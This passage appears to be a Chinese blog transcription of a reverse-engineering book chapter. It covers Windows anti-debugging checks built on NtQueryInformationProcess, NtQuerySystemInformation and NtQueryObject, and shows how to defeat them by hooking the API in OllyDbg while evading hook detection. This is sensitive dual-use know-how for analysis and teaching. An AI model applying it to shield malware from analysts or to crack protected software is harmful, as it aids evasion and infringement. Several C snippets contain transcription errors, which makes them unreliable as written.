ProcessEnergyValues             = <span class="hljs-number">0x4C</span>,<br>    ProcessActivityThrottleState        = <span class="hljs-number">0x4D</span>,<br>    ProcessActivityThrottlePolicy           = <span class="hljs-number">0x4E</span>,<br>    ProcessWin32kSyscallFilterInformation       = <span class="hljs-number">0x4F</span>,<br>    ProcessDisableSystemAllowedCpuSets      = <span class="hljs-number">0x50</span>,<br>    ProcessWakeInformation              = <span class="hljs-number">0x51</span>,<br>    ProcessEnergyTrackingState          = <span class="hljs-number">0x52</span>,<br>    ProcessManageWritesToExecutableMemory       = <span class="hljs-number">0x53</span>,<br>    ProcessCaptureTrustletLiveDump          = <span class="hljs-number">0x54</span>,<br>    ProcessTelemetryCoverage            = <span class="hljs-number">0x55</span>,<br>    ProcessEnclaveInformation           = <span class="hljs-number">0x56</span>,<br>    ProcessEnableReadWriteVmLogging         = <span class="hljs-number">0x57</span>,<br>    ProcessUptimeInformation            = <span class="hljs-number">0x58</span>,<br>    ProcessImageSection             = <span class="hljs-number">0x59</span>,<br>    ProcessDebugAuthInformation         = <span class="hljs-number">0x5A</span>,<br>    ProcessSystemResourceManagement         = <span class="hljs-number">0x5B</span>,<br>    ProcessSequenceNumber               = <span class="hljs-number">0x5C</span>,<br>    ProcessLoaderDetour             = <span class="hljs-number">0x5D</span>,<br>    ProcessSecurityDomainInformation        = <span class="hljs-number">0x5E</span>,<br>    ProcessCombineSecurityDomainsInformation    = <span class="hljs-number">0x5F</span>,<br>    ProcessEnableLogging            = <span class="hljs-number">0x60</span>,<br>    ProcessLeapSecondInformation        = <span class="hljs-number">0x61</span>,<br>    ProcessFiberShadowStackAllocation       = <span class="hljs-number">0x62</span>,<br>    ProcessFreeFiberShadowStackAllocation       = <span class="hljs-number">0x63</span>,<br>    MaxProcessInfoClass             = <span class="hljs-number">0x64</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>以上代码中与调试器探测有关的成员为ProcessDebugPort(0x7)、ProcessDebugObject-Handle(0x1E)、ProcessDebugFlags(0x1F)。</p><h2 id="51-3-1-ProcessDebugPort-0x7"><a href="#51-3-1-ProcessDebugPort-0x7" class="headerlink" title="51.3.1 ProcessDebugPort(0x7)"></a>51.3.1 ProcessDebugPort(0x7)</h2><p>进程处于调试状态时，系统就会为它分配1个调试端口（Debug Port )。 ProcessInformationClass参数的值设置为ProcessDebugPort(0x7)时，调用NtQueryInformationProcess()函数就能获取调试端口。若进程处于非调试状态，则变量dwDebugPort的值设置为0;若进程处于调试状态，则变量dwDebugPort的值设置为0xFFFFFFFF (参考代码51-6 )。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ProcessDebugPort (0x7)</span><br>DWORD dwDebugPort = <span class="hljs-number">0</span>;<br>pNtQuerylnformationProcess(GetCurrentProcess(),<br>ProcessDebugPort,<br>&amp;dwDebugPort,<br><span class="hljs-keyword">sizeof</span>(dwDebugPort),<br><span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtQueryInformationProcess(ProcessDebugPort) = 0x%X\n&quot;</span>,dwDebugPort);<br><span class="hljs-keyword">if</span>( dwDebugPort != <span class="hljs-number">0x0</span> )<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; =&gt; Debugging!!!\n\n&quot;</span>)；<br><span class="hljs-keyword">else</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; =&gt; Not Debugging...\n\n&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>CheckRemoteDebuggerPresent()</strong></p><p>CheckRemoteDebuggerPresent() API与IsDebuggerPresent() API类似，用来检测进程是否处于调试状态。CheckRemoteDebuggerPresent()函数不仅可以用来检测当前进程，还可以用来检测其他进程是否处于被调试状态。进入CheckRemoteDebuggerPresent() API查看代码，可以看到其调用了NtQuerylnformationProcess(ProcessDebugPort) API (参见图51-14 )。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322204747265.png#alt=image-20220322204747265"></p><h2 id="51-3-2-ProcessDebugObjectHandle-0x1E"><a href="#51-3-2-ProcessDebugObjectHandle-0x1E" class="headerlink" title="51.3.2 ProcessDebugObjectHandle(0x1E)"></a>51.3.2 ProcessDebugObjectHandle(0x1E)</h2><p>调试进程时会生成调试对象（Debug Object )。函数的第二个参数值为ProcessDebugObjectHandle(0x1E)时，调用函数后通过第三个参数就能获取调试对象句柄。进程处于调试状态时，调试对象句柄的值就存在；若进程处于非调试状态，则调试对象句柄值为NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ProcessDebugObjectHandle(0x1E)</span><br>DWORD hDebugObject = <span class="hljs-number">0</span>;<br>pNtQuerylnformationProcess(GetCurrentProcess(),<br>ProcessDebugObjectHandle,<br>&amp;hDebugObject,<br><span class="hljs-keyword">sizeof</span>(dwDebugPort),<br><span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtQueryInformationProcess(ProcessDebugObjectHandle) = 0x%X\n&quot;</span>,hDebugObject);<br><span class="hljs-keyword">if</span>( hDebugObject != <span class="hljs-number">0x0</span> )<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; =&gt; Debugging!!!\n\n&quot;</span>)；<br><span class="hljs-keyword">else</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; =&gt; Not Debugging...\n\n&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="51-3-3-ProcessDebugFlags-0x1F"><a href="#51-3-3-ProcessDebugFlags-0x1F" class="headerlink" title="51.3.3 ProcessDebugFlags(0x1F)"></a>51.3.3 ProcessDebugFlags(0x1F)</h2><p>检测Debug Flags (调试标志）的值也可以判断进程是否处于被调试状态。函数的第二个参数设置为ProcessDebugFlags(0x1F)时，调用函数后通过第三个参数即可获取调试标志的值：若为0，则进程处于被调试状态；若为1，则进程处于非调试状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ProcessDebugFlags(0x1F)</span><br>BOOL bDebugFlag = <span class="hljs-number">0</span>;<br>pNtQuerylnformationProcess(GetCurrentProcess(),<br>ProcessDebugFlags,<br>&amp;bDebugFlag,<br><span class="hljs-keyword">sizeof</span>(dwDebugPort),<br><span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtQueryInformationProcess(ProcessDebugFlags) = 0x%X\n&quot;</span>,bDebugFlag);<br><span class="hljs-keyword">if</span>( bDebugFlag == <span class="hljs-number">0x0</span> )<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; =&gt; Debugging!!!\n\n&quot;</span>)；<br><span class="hljs-keyword">else</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; =&gt; Not Debugging...\n\n&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="51-3-4-练习：StaAD-NtQIP-exe"><a href="#51-3-4-练习：StaAD-NtQIP-exe" class="headerlink" title="51.3.4 练习：StaAD_NtQIP.exe"></a>51.3.4 练习：StaAD_NtQIP.exe</h2><p>下面通过StaAD_NtQIP.exe示例程序练习基于NtQueryInformationProcess()函数的反调试。在OllyDbg调试器中运行示例程序后，借助NtQueryInformationProcess()反调试技术显示“探测到调试器”的信息，如图51-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322213859777.png#alt=image-20220322213859777"></p><h2 id="51-3-5-破解之法"><a href="#51-3-5-破解之法" class="headerlink" title="51.3.5 破解之法"></a>51.3.5 破解之法</h2><p>要想破解使用NtQueryInformationProcess() API探测调试器的技术，应当对该函数在特定参数值（ProcessInformationClass )下输出的值（返回-Processlnformation )进行操作（参考代码51-4 )。</p><p>特定参数值是前面提过的 ProcessDebugPort ( 0x7 )、ProcessDebugObjectHandle ( 0x1E )、</p><p>ProcessDebugFlags ( 0x1F )。</p><p>若只是调用几次API，则可以在调试器中手动操作输岀值。相反，若函数被反复调用，则需要使用API钩取技术。在练习中我们将使用OllyDbg的汇编命令手动设置钩取代码。</p><blockquote><p>此处介绍的使用API钩取破解反调试的方法只是为了说明相关概念与原理。实际操作中直接使用相应的调试器插件（如：advanced olly)即可解决问题。每次在插件中启动调试时，都会自动钩取API。</p></blockquote><p>首先重新运行OllyDbg调试器。</p><p><strong>确定钩取函数的位置</strong></p><p>使用DLL注入技术钩取API时，钩取函数一般位于要注入的DLL文件内部。为了操作方便，我们将钩取代码设置在代码节区中的最后一个NULL Padding区域——407E00地址处，如图51-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323100956141.png#alt=image-20220323100956141"></p><p><strong>修改原API代码</strong></p><p>进入原NtQueryInformationProcess() API代码，如图51 -17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323101239718.png#alt=image-20220323101239718"></p><p>在该处设置一条JMP指令，用来跳转到钩取函数地址处（407E00)。利用OllyDbg的汇编功能将7C93D7EA地址处的代码修改为<code>JMP 00407E00</code>指令，如图51 -18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323101332652.png#alt=image-20220323101332652"></p><p>该JMP指令为5个字节，可以准确覆写原代码中的<code>CALL DWORD PTR DS:[EDX]</code> &amp; <code>RETN 14</code> 指令（位于地址77F06092~77F06097)。</p><blockquote><p>钩取API时，一般要在原API起始地址处设置JMP指令。以上面这种情形为例，JMP指令要设置在77F06088地址处，但是我却将JMP命令设置在略微偏下的地址处（7C93D7EA），这是为了回避某些PE保护器的API钩取探测功能。这些PE保护器会检测NtQueryInformationProcess() API起始地址的第一个字节，若非“B8”，则认为该API被钩取，就会执行某些非正常运行的行为（也算是一种调试器探测技术）。当然，如果采用更精巧的API钩取探测技术，那么上面这种回避方法就会失效，必须采用其他更好的方法。</p></blockquote><p><strong>编写钩取函数</strong></p><p>在407E00地址处编写钩取函数，如图51-19所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323102318404.png#alt=image-20220323102318404"></p><p>地址407E00处的<code>CALL DWORD PTR DS:[EDX]</code>指令与地址407E3B处的<code>RETN 14</code>指令都是原NtQuerylnformationProcess() API中的代码，钩取代码就设置在这2条指令之间。</p><p>407C03地址之后的CMP&#x2F;JNZ指令组合类似于C语言中的switch&#x2F;case多分支选择语句。ProcessInformationClass参数（DWORD PTR SS:[ESP+C])值为0x7、0x1E、0x1F之一时，则将Processlnformation参数（DWORD PTR SS:[ESP+10])地址所指的返回值分别修改为0、0、1。在该状态下（在调试器中）运行进程，即可破解基于NtQueryInformationProcess() API的反调试技术，如图51-20所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323102429589.png#alt=image-20220323102429589"></p><h1 id="51-4-NtQuerySystemlnformation"><a href="#51-4-NtQuerySystemlnformation" class="headerlink" title="51.4 NtQuerySystemlnformation()"></a>51.4 NtQuerySystemlnformation()</h1><p>下面介绍基于<strong>调试环境检测</strong>的反调试技术。</p><blockquote><p>前面介绍的反调试技术中，我们通过探测调试器来判断自己的进程是否处于被调试状态，这是一种非常直接的调试器探测方法。除此之外，还有间接探测调试器的方法，借助该方法可以检测调试环境，若显露出调试器的端倪，则立刻停止执行程序。运用这种反调试技术可以检测当前OS是否在调试模式下运行</p></blockquote><blockquote><p>为了使用WinDbg工具调试系统内核（Kernel Debugging )，需要先准备2个系统（Host、Target）并连接（Serial、1394、USB、Direct Cable）。其中，Target 的OS 以调试模式运行，连接到Host系统的WinDbg上后即可调试。</p></blockquote><p><strong>设置调试模式的方法</strong></p><p>(1) Windows XP：编辑 “C:\boot.ini” 后重启</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">[boot loader]<br>timeout=<span class="hljs-number">30</span><br><span class="hljs-keyword">default</span>=multi(<span class="hljs-number">0</span>)disk(<span class="hljs-number">0</span>)rdisk(<span class="hljs-number">0</span>)partition(<span class="hljs-number">1</span>)\WINDOWS<br>[operating systems]<br>multi(<span class="hljs-number">0</span>)disk(<span class="hljs-number">0</span>)rdisk(<span class="hljs-number">0</span>)partition(<span class="hljs-number">1</span>)\WINDOWS=<span class="hljs-string">&quot;Microsoft Windows XP Professional&quot;</span> /noexecute=optin /fastdetect /debug /debugport=com1 /baudrate=<span class="hljs-number">115200</span><br></code></pre></td></tr></table></figure><p>(2) Windows 7：使用 bcdedit.exe 实用程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">bcdedit /debug on<br></code></pre></td></tr></table></figure><p>ntdll!NtQuerySystemInformation()API是一个系统函数，用来获取当前运行的多种OS信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS WINAPI <span class="hljs-title function_">NtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="hljs-params">  [in, out]       PVOID                    SystemInformation,</span><br><span class="hljs-params">  [in]            ULONG                    SystemInformationLength,</span><br><span class="hljs-params">  [out, optional] PULONG                   ReturnLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>SYSTEM_INFORMATION_CLASS SystemlnformationClass参数中指定需要的系统信息类型，将某结构体的地址传递给PVOID Systemlnformation参数，API返回时，该结构体中就填充着相关信息。</p><p>SYSTEM_INFORMATION_CLASS是枚举类型，拥有的值如代码51-10所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">SYSTEM_INFORMATION_CLASS</span> &#123;</span><br>SystemBasicInformation = <span class="hljs-number">0</span>,<br>SystemPerformanceInformation = <span class="hljs-number">2</span>,<br>SystemTimeOfDayInformation = <span class="hljs-number">3</span>,<br>SystemProcessesAndThreadsInformation = <span class="hljs-number">5</span>,<br>SystemProcessorTimes = <span class="hljs-number">8</span>,<br>SystemProcessorStatistics = <span class="hljs-number">23</span>,<br>SystemExceptionInformation = <span class="hljs-number">33</span>,<br>SystemKernelDebuggerInformation = <span class="hljs-number">35</span>,<br>SystemRegistryQuotaInformation = <span class="hljs-number">37</span>,<br>SystemLookasideInformation = <span class="hljs-number">45</span><br>&#125; SYSTEM_INFORMATION_CLASS;<br></code></pre></td></tr></table></figure><p>向SystemlnformationClass参数传入SystemKernelDebuggerInformation（ 0x23 ),即可判断岀</p><p>当前OS是否在调试模式下运行。</p><h2 id="51-4-1-SystemKernelDebuggerlnformation-0x23"><a href="#51-4-1-SystemKernelDebuggerlnformation-0x23" class="headerlink" title="51.4.1 SystemKernelDebuggerlnformation(0x23)"></a>51.4.1 SystemKernelDebuggerlnformation(0x23)</h2><p>查看实际的反调试源代码即可轻松掌握其工作原理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">MyNtQuerySystemInformation</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(WINAPI *NTQUERYSYSTEMINFORMATION)</span><span class="hljs-params">(</span><br><span class="hljs-params">        ULONG SystemInformationClass,</span><br><span class="hljs-params">        PVOID SystemInformation,</span><br><span class="hljs-params">        ULONG SystemInformationLength,</span><br><span class="hljs-params">        PULONG ReturnLength</span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_KERNEL_DEBUGGER_INFORMATION</span> </span><br><span class="hljs-class">    &#123;</span><br>        BOOLEAN DebuggerEnabled;<br>        BOOLEAN DebuggerNotPresent;<br>    &#125; SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;<br><br>    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;<br>  <br>    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)  <br>                                GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;ntdll&quot;</span>), <br>                                               <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br><br>    ULONG SystemKernelDebuggerInformation = <span class="hljs-number">0x23</span>;<br>    ULONG ulReturnedLength = <span class="hljs-number">0</span>;<br>    SYSTEM_KERNEL_DEBUGGER_INFORMATION DebuggerInfo = &#123;<span class="hljs-number">0</span>,&#125;;<br><br>    NtQuerySystemInformation(SystemKernelDebuggerInformation, <br>                             (PVOID) &amp;DebuggerInfo, <br>                             <span class="hljs-keyword">sizeof</span>(DebuggerInfo),      <span class="hljs-comment">// 2 bytes</span><br>                             &amp;ulReturnedLength);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NtQuerySystemInformation(SystemKernelDebuggerInformation) = 0x%X 0x%X\n&quot;</span>, <br>           DebuggerInfo.DebuggerEnabled, DebuggerInfo.DebuggerNotPresent);<br>    <span class="hljs-keyword">if</span>( DebuggerInfo.DebuggerEnabled )  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  =&gt; Debugging!!!\n\n&quot;</span>);<br>    <span class="hljs-keyword">else</span>                                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  =&gt; Not debugging...\n\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述代码中调用NtQuerySystemInformation() API时，第一个参数（SystemlnformationClass）的值设置为 SystemKernelDebuggerInformation(0x23),第二个参数（Systemlnformation）为SYSTEM_KERNEL_DEBUGGER_INFORMATION结构体的地址。当API返回时，若系统处在调试模式下，则 SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled的值设置为 1）SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerNotPresent的值恒为1）。</p><h2 id="51-4-2-练习：StaAD-NtQSI-exe"><a href="#51-4-2-练习：StaAD-NtQSI-exe" class="headerlink" title="51.4.2 练习：StaAD_NtQSI.exe"></a>51.4.2 练习：StaAD_NtQSI.exe</h2><p>运行练习示例StaAD_NtQSI.exe，如图51 -21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323105509567.png#alt=image-20220323105509567"></p><p>我的测试环境启动时默认处于调试模式，所以运行示例程序后显示“探测到调试环境”的信息。</p><h2 id="51-4-3破解之法"><a href="#51-4-3破解之法" class="headerlink" title="51.4.3破解之法"></a>51.4.3破解之法</h2><p>在Windows XP系统中编辑boot.ini文件，删除 <code>/debugport=com1 /baudrate=115200 /Debug</code>值。在Windows 7系统的命令行窗口执行<code>bcdedit/debug off</code>命令即可。并且，若重启系统则要以正常模式（Normal Mode）启动。</p><blockquote><p>问题：可以Hook吗？</p></blockquote><h1 id="51-5-NtQueryObject"><a href="#51-5-NtQueryObject" class="headerlink" title="51.5 NtQueryObject()"></a>51.5 NtQueryObject()</h1><p>系统中的某个调试器调试进程时，会创建1个调试对象类型的内核对象。检测该对象是否存在即可判断是否有进程正在被调试。</p><p>ntdll!NtQueryObject() API用来获取系统各种内核对象的信息，NtQueryObject()函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS <span class="hljs-title function_">NtQueryObject</span><span class="hljs-params">(</span><br><span class="hljs-params">    _In_opt_  HANDLE  Handle,</span><br><span class="hljs-params">    _In_      OBJECT_INFORMATION_CLASS ObjectInformationClass,</span><br><span class="hljs-params">    _Out_opt_ PVOID   ObjectInformation,</span><br><span class="hljs-params">    _In_ ULONGObjectInformationLength,</span><br><span class="hljs-params">    _Out_opt_PULONG ReturnLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>调用 NtQueryObject()函数时，先向第二个参数<code>OBJECT_NFORMATION_CLASS ObjectlnformationClass</code>赋予某个特定值，调用API后，包含相关信息的结构体指针就被返回第三</p><p>个参数PVOID Objectlnformation。</p><p>OBJECT_INFORMATION_CLASS是枚举类型，其拥有的值如代码51-13所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">OBJECT_INFORMATION_CLASS</span> &#123;</span><br>    ObjectBasicInformation,<br>    ObjectNameInformation,<br>    ObjectTypeInformation,<br>    ObjectAllTypesInformation, <span class="hljs-comment">// 3</span><br>    ObjectHandleInformation<br>&#125; OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;<br></code></pre></td></tr></table></figure><p>首先使用ObjectAllTypesInformation值获取系统所有对象信息，然后从中检测是否存在调试对象。NtQueryObject() API使用方法略为复杂。</p><p><strong>NtQueryObject() API使用方法</strong></p><p>(1) 获取内核对象信息链表的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">ULONG lSize = <span class="hljs-number">0</span>;<br>pNtQueryObject(<span class="hljs-literal">NULL</span>, ObjectAllTypesInformation, &amp;lSize, <span class="hljs-keyword">sizeof</span>(lSize), &amp;lSize);<br></code></pre></td></tr></table></figure><p>(2) 分配内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *pBuf = <span class="hljs-literal">NULL</span>;<br>pBuf = VirtualAlloc(<span class="hljs-literal">NULL</span>, lSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br></code></pre></td></tr></table></figure><p>(3) 获取内核对象信息链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_TYPE_INFORMATION</span> &#123;</span><br>    UNICODE_STRING TypeName;<br>    ULONG TotalNumberOfHandles;<br>    ULONG TotalNumberOfObjects;<br>&#125;OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ALL_INFORMATION</span> &#123;</span><br>    ULONG                   NumberOfObjectsTypes;<br>    OBJECT_TYPE_INFORMATION ObjectTypeInformation[<span class="hljs-number">1</span>];<br>&#125; OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;<br><br>pNtQueryObject((HANDLE)<span class="hljs-number">0xFFFFFFFF</span>, ObjectAllTypesInformation, pBuf, lSize, <span class="hljs-literal">NULL</span>);<br>pObjectAllInfo = (POBJECT_ALL_INFORMATION)pBuf;<br></code></pre></td></tr></table></figure><p>调用NtQueryObject()函数后，系统所有对象的信息代码就被存入pBuf，然后将pBuf转换（casting）为POBJECT_ALL_INFORMATION类型。OBJECT_ALL_INFORMATION结构体由OBJECT_TYPE_INFORMATION结构体数组构成。实际内核对象类型的信息就被存储在OBJECT_TYPE_INFORMATION结构体数组中，通过循环检索即可查看是否存在“调试对象”对象类型。</p><p>(4)确定“调试对象”对象类型</p><p>为便于理解，请先看下面一段代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 